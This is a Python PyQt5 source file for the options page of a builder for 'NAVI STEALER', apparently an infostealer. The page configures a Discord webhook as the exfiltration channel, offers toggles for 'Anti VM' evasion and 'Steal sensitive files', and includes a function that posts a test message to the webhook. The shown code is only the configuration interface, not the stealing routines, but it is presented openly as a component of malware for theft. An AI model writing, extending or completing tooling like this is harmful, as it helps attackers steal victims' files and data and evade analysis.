import re

from PyQt5.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, 
    QCheckBox, QGroupBox, QScrollArea, QLineEdit, QPushButton
)
from PyQt5.QtCore import Qt
from PyQt5.QtGui import QFont

from ..styles import SCROLL_STYLE
from .message_box import CustomMessageBox

class OptionsPage(QWidget):
    def __init__(self):
        super().__init__()
        self.debugging_active = False
        self.security_active = False
        self.files_active = False
        self.ping_active = False
        self.init_ui()

    def init_ui(self):
        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(30, 30, 30, 30)
        main_layout.setSpacing(20)
        
        telegram_group = QGroupBox("Discord")
        telegram_group.setStyleSheet("""
            QGroupBox {
                font-size: 13px;
                font-weight: bold;
                color: #00a2ff;
                border: 1px solid #2a2a3a;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        telegram_layout = QVBoxLayout()
        telegram_layout.setContentsMargins(15, 20, 15, 15)
        telegram_layout.setSpacing(10)
        
        self.bot_token_input = QLineEdit()
        self.bot_token_input.setPlaceholderText("discord webhook url")
        self.bot_token_input.setMinimumHeight(35)
        
        test_telegram_btn = QPushButton("check")
        test_telegram_btn.setObjectName("testButton")
        test_telegram_btn.setFixedSize(80, 35)
        test_telegram_btn.clicked.connect(self.check_telegram)
        
        telegram_layout.addWidget(self.bot_token_input)
        telegram_layout.addWidget(test_telegram_btn, alignment=Qt.AlignRight)
        telegram_group.setLayout(telegram_layout)
        
        features_group = QGroupBox("features")
        features_group.setStyleSheet("""
            QGroupBox {
                font-size: 13px;
                font-weight: bold;
                color: #00a2ff;
                border: 1px solid #2a2a3a;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)

        TOGGLE_STYLE_OFF = """
            QPushButton {
                background-color: #12121e;
                color: #555;
                border: 1px solid #2a2a3a;
                border-radius: 6px;
                font-size: 12px;
                font-weight: bold;
                padding: 0 12px;
            }
            QPushButton:hover {
                border-color: #00a2ff;
                color: #00a2ff;
            }
        """
        TOGGLE_STYLE_ON = """
            QPushButton {
                background-color: #0a1a2e;
                color: #00a2ff;
                border: 1px solid #00a2ff;
                border-radius: 6px;
                font-size: 12px;
                font-weight: bold;
                padding: 0 12px;
            }
            QPushButton:hover {
                background-color: #0d2040;
            }
        """

        features_layout = QHBoxLayout()
        features_layout.setContentsMargins(15, 20, 15, 15)
        features_layout.setSpacing(10)

        self.btn_debugging = QPushButton("Debug")
        self.btn_debugging.setFixedHeight(35)
        self.btn_debugging.setStyleSheet(TOGGLE_STYLE_OFF)
        self.btn_debugging.clicked.connect(lambda: self.toggle_feature("debugging"))

        self.btn_security = QPushButton("Anti VM")
        self.btn_security.setFixedHeight(35)
        self.btn_security.setStyleSheet(TOGGLE_STYLE_OFF)
        self.btn_security.clicked.connect(lambda: self.toggle_feature("security"))

        self.btn_files = QPushButton("Steal sensitive files")
        self.btn_files.setFixedHeight(35)
        self.btn_files.setStyleSheet(TOGGLE_STYLE_OFF)
        self.btn_files.clicked.connect(lambda: self.toggle_feature("files"))

        self.btn_ping = QPushButton("Ping on hit")
        self.btn_ping.setFixedHeight(35)
        self.btn_ping.setStyleSheet(TOGGLE_STYLE_OFF)
        self.btn_ping.clicked.connect(lambda: self.toggle_feature("ping"))

        self._toggle_styles = {"off": TOGGLE_STYLE_OFF, "on": TOGGLE_STYLE_ON}
        self._feature_buttons = {
            "debugging": self.btn_debugging,
            "security":  self.btn_security,
            "files":     self.btn_files,
            "ping":      self.btn_ping,
        }
        self._feature_states = {
            "debugging": False,
            "security":  False,
            "files":     False,
            "ping":      False,
        }

        features_layout.addWidget(self.btn_debugging)
        features_layout.addWidget(self.btn_security)
        features_layout.addWidget(self.btn_files)
        features_layout.addWidget(self.btn_ping)
        features_group.setLayout(features_layout)

        info_group = QGroupBox("information")
        info_group.setStyleSheet("""
            QGroupBox {
                font-size: 13px;
                font-weight: bold;
                color: #00a2ff;
                border: 1px solid #2a2a3a;
                border-radius: 6px;
                margin-top: 10px;
                padding-top: 15px;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        info_layout = QVBoxLayout()
        info_layout.setContentsMargins(15, 25, 15, 15)
        info_layout.setSpacing(15)
        
        info_text = QLabel("NAVI STEALER\n\nAll exfiltration is handled via Discord.\nMake sure to provide a valid webhook.")
        info_text.setStyleSheet("color: #aaa; font-size: 13px;")
        info_text.setAlignment(Qt.AlignCenter)
        
        github_link = QLabel('<a href="https://github.com/glockinhand/navi-multitool" style="color: #00a2ff; text-decoration: none; font-size: 14px; font-weight: bold;">GITHUB.COM/GLOCKINHAND/NAVI-MULTITOOL</a>')
        github_link.setOpenExternalLinks(True)
        github_link.setAlignment(Qt.AlignCenter)
        
        info_layout.addWidget(info_text)
        info_layout.addWidget(github_link)
        info_group.setLayout(info_layout)
        
        main_layout.addWidget(telegram_group)
        main_layout.addWidget(features_group)
        main_layout.addWidget(info_group)
        main_layout.addStretch()
        
        self.setLayout(main_layout)

    def toggle_feature(self, feature: str):
        state = not self._feature_states[feature]
        self._feature_states[feature] = state
        style = self._toggle_styles["on"] if state else self._toggle_styles["off"]
        self._feature_buttons[feature].setStyleSheet(style)

        if feature == "debugging":
            self.on_debugging_toggled(state)
        elif feature == "security":
            self.on_security_toggled(state)
        elif feature == "files":
            self.on_files_toggled(state)
        elif feature == "ping":
            self.on_ping_toggled(state)

    def on_debugging_toggled(self, active: bool):
        self.debugging_active = active

    def on_security_toggled(self, active: bool):
        self.security_active = active

    def on_files_toggled(self, active: bool):
        self.files_active = active

    def on_ping_toggled(self, active: bool):
        self.ping_active = active

    def get_telegram_config(self):
        return {
            "webhook": self.bot_token_input.text().strip(),
            "debugging": self.debugging_active,
            "security": self.security_active,
            "files": self.files_active,
            "ping": self.ping_active
        }
    
    def check_telegram(self):
        token = self.bot_token_input.text().strip()

        try:
            import requests

            url = token
            embed = {
                "embeds": [
                    {
                        "title": "NAVI — Connection Check",
                        "description": "✅ Webhook connection successful.",
                        "color": 0x5865F2,
                        "footer": {
                            "text": "NAVI • https://github.com/glockinhand/navi-multitool"
                        },
                        "timestamp": __import__("datetime").datetime.utcnow().isoformat()
                    }
                ]
            }

            r = requests.post(url, json=embed, timeout=10)

            if r.status_code in (200, 204):
                self.box = CustomMessageBox("NAVI", "success", "NAVI: check sent!")
            else:
                self.box = CustomMessageBox("NAVI", "error", "NAVI: invalid webhook")
            self.box.show()
        except Exception as e:
            self.box = CustomMessageBox("NAVI", "error", "NAVI: error")
            self.box.show()